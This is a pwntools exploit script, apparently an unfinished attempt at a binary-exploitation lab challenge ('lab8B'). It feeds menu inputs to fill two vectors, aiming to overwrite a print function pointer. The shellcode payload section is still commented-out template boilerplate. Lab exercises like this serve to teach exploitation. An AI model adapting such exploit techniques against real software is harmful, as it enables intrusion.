#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

exe = './lab8B'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main+176
break *main+198
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

#PoC - overwrite print function on sum vector printf
#io.recvuntil("I COMMAND YOU TO ENTER YOUR COMMAND:")
io.recv()
#io.recvuntil("9. Get help")
#io.recv()
io.sendline("1")
io.recv()

#Write vector 1
io.sendline("1")
io.recv()
io.sendline("\xff") #char
#io.recv()
io.sendline("1") #short
#io.recv()
io.sendline("1") #ushort
#io.recv()
io.sendline("1") #int
#io.recv()
io.sendline("1") #uint
#io.recv()
io.sendline("1") #long
#io.recv()
io.sendline("1") #ulong
#io.recv()
io.sendline("1") #longlong
#io.recv()
io.sendline("1") #ulonglong

#
io.recv()
io.sendline("1")
#io.recv()

#Write vector 2
io.sendline("2")
io.recv()
io.sendline("\xff") #char
#io.recv()
io.sendline("1") #short
#io.recv()
io.sendline("1") #ushort
#io.recv()
io.sendline("1") #int
#io.recv()
io.sendline("1") #uint
#io.recv()
io.sendline("1") #long
#io.recv()
io.sendline("1") #ulong
#io.recv()
io.sendline("1") #longlong
#io.recv()
io.sendline("1") #ulonglong


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
gdb.attach(io, gdbscript=gdbscript)
io.interactive()

